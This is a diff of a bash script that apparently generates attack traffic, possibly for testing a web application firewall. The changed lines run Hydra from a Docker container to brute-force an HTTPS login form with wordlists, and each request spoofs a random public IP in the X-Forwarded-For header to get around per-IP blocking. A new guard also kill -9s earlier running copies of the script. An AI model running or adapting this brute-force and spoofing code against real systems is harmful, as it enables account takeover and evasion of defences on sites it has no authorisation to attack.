@@ -3,9 +3,10 @@
 # set -x
 
 already=$(ps -ef | grep "$0" | grep bash | grep -v grep | wc -l)
+alreadypid=$(ps -ef | grep "$0" | grep bash | grep -v grep | awk '{ print $2 }')
 if [  $already -gt 2 ]; then
-    echo -e "The script is already running `expr $already - 2` time."
-    #killall $(basename "$0") > /dev/null 2>&1
+    echo "The script is already running `expr $already - 2` time."
+    kill -9 $alreadypid > /dev/null 2>&1
     exit 1
 fi
 
@@ -32,10 +33,12 @@ do
         if [[  $port == 443 ]]; then
             echo -e "\n# site $i ${sitefqdn[$i]} brute force attack"
 
+            nmapcmd=$(whereis nmap | awk '{ print $2 }')
+            dockercmd=$(whereis docker | awk '{ print $2 }')
             for i in {1..5}
             do
-                xff=$(nmap -n -iR 1 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,224-255.-.-.- -sL | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*")
-                sudo docker exec -i -t asm-brute-force /usr/bin/hydra -V -S -w 5 -T 50 -L /hydra/users10.txt -P /hydra/pass100.txt ${ip:1:-1} https-form-post "/user/login:username=^USER^&password=^PASS^:S=Account:H=X-forwarded-for: $xff"
+                xff=$($nmapcmd -n -iR 1 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,224-255.-.-.- -sL | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*")
+                sudo $dockercmd exec -i -t asm-brute-force /usr/bin/hydra -V -S -w 5 -T 50 -L /hydra/users10.txt -P /hydra/pass100.txt ${ip:1:-1} https-form-post "/user/login:username=^USER^&password=^PASS^:S=Account:H=X-forwarded-for: $xff"
             done
         fi
     fi
